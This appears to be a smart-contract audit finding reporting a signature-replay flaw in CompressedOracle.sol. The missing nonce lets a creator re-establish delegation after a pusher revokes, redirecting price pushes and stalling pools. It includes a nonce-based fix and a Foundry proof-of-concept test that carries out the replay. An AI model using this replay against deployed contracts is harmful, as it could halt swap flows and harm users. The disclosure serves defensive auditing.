### Title
Pusher consent signature is replayable within the deadline window, allowing a creator to nullify a pusher's self-revocation and permanently redirect their price pushes — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` accepts an EIP-191 signature that commits to `(chainid, oracle, deadline, pusher, creator)` but contains no nonce. A creator who holds a valid signature can call `allowPushers` an unlimited number of times before the deadline expires. Because `revokePusher` only clears `namespaceRemapping[pusher]` without invalidating the original signature, the creator can immediately replay the signature to re-establish delegation after every revocation attempt. The pusher cannot permanently stop their pushes from landing in the creator's namespace until the deadline timestamp passes.

---

### Finding Description

`allowPushers` in `CompressedOracle.sol` verifies a pusher's EIP-191 consent signature and writes `namespaceRemapping[pusher] = msg.sender`: [1](#0-0) 

The signed message is `keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))`. There is no nonce, no per-pusher revocation counter, and no on-chain record that the signature was consumed. The only expiry mechanism is the `deadline` timestamp checked by `_ensureDeadline`: [2](#0-1) 

`revokePusher` clears the mapping entry but does nothing to the signature: [3](#0-2) 

The code's own NatSpec comment acknowledges the replay risk but incorrectly claims the deadline resolves it: [4](#0-3) 

The deadline only prevents replay **after** it expires. Within the window `[now, deadline]` the same bytes can be submitted to `allowPushers` repeatedly. The attack sequence is:

1. Pusher signs consent with `deadline = now + N days`.
2. Creator calls `allowPushers(deadline, [pusher], [sig])` → `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator immediately calls `allowPushers(deadline, [pusher], [sig])` again with the identical signature → `namespaceRemapping[pusher] = creator` is restored.
5. Steps 3–4 repeat indefinitely until `block.timestamp > deadline`.

The fallback push path resolves the effective namespace at call time: [5](#0-4) 

So every push the pusher makes after the creator replays the signature lands in the creator's namespace, not the pusher's own. The pusher's own namespace receives no updates.

---

### Impact Explanation

Any pool whose `AnchoredPriceProvider` or `ProtectedPriceProvider` is bound to the pusher's own-namespace `feedId` will read a timestamp that stops advancing. Once the elapsed time exceeds `MAX_REF_STALENESS`, `_readLeg` returns `ok = false`: [6](#0-5) 

`getBidAndAskPrice` then reverts with `FeedStalled`: [7](#0-6) 

Every swap through the pool fails. This matches the allowed impact: **broken core pool functionality causing unusable swap flows**. The end-to-end propagation is confirmed by the existing test: [8](#0-7) 

---

### Likelihood Explanation

The trigger requires only that:
- A pusher has signed a consent with a non-trivial deadline (any deadline longer than the staleness window of the target pool).
- The creator retains the signature bytes (trivially satisfied — they submitted the transaction).
- The creator calls `allowPushers` again after the pusher revokes.

All three conditions are reachable by any creator without any privileged role. The pusher may be an automated off-chain service that continues pushing prices regardless of the on-chain delegation state, making the namespace-redirect silent and persistent.

---

### Recommendation

Add a per-pusher revocation nonce to the signed message and increment it on every successful `revokePusher` or `removePushers` call:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender,
        pusherNonce[pusher]   // <-- bind to current nonce
    ))
);

// In revokePusher / removePushers, after clearing the mapping:
pusherNonce[pusher]++;
```

This ensures that any signature obtained before a revocation is cryptographically invalidated the moment the pusher revokes, regardless of whether the deadline has expired.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayRevocationPoC is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function test_replayAfterRevoke() public {
        uint256 deadline = block.timestamp + 7 days;

        // Pusher signs consent
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // Step 1: Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation set");

        // Step 2: Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // Step 3: Creator replays the SAME signature — revocation nullified
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator,
            "VULNERABILITY: delegation re-established with the same signature");

        // Pusher's pushes now go to creator's namespace, not their own.
        // Pusher's own-namespace feeds go stale → pools using them halt.
    }
}
```
